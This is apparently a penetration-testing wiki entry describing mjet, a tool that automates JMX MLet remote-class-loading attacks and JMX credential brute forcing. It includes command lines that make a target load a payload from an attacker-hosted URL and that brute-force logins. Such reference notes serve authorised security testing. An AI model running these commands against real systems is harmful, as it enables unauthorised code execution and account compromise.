# mjet

**Tags:** `#mjet` `#jmx` `#mlet` `#rce` `#java`

MOGWAI Java Exploitation Toolkit (mogwaisec) — automates the classic JMX **MLet** remote-class-loading attack. Given an unauthenticated JMX service and an attacker-hosted MLet HTML + malicious MBean jar, mjet registers the MLet MBean, loads the remote class, and invokes it for RCE. Also does JMX credential brute forcing. The technique mjet automates is the same one behind several product RCEs (e.g. Pega CVE-2022-24082).

**Source:** https://github.com/mogwaisec/mjet
**Install:** `git clone https://github.com/mogwaisec/mjet && pip install -r requirements.txt` (Python).

```bash
# MLet attack — load and run a payload class from your HTTP server
python3 mjet.py --jmxhost <target> --jmxport 1099 --attack mlet \
  --payload_url http://<attacker>:8080/mlet.html

# JMX credential brute force
python3 mjet.py --jmxhost <target> --jmxport 1099 --attack bruteforce \
  --usernames users.txt --passwords passwords.txt
```

Modern all-in-one alternative: [[Tools/Web/beanshooter|beanshooter]].

---

> [!note] **See also** — [[Services/Web Services/JMX|JMX]] — automated MLet remote-class-loading RCE and JMX brute force. Also [[Services/Web Services/Pega|Pega]] — the CVE-2022-24082 exposed-JMX RCE uses this MLet technique.

---

*Created: 2026-09-25*
*Updated: 2026-09-25*
*Model: claude-opus-4-8*
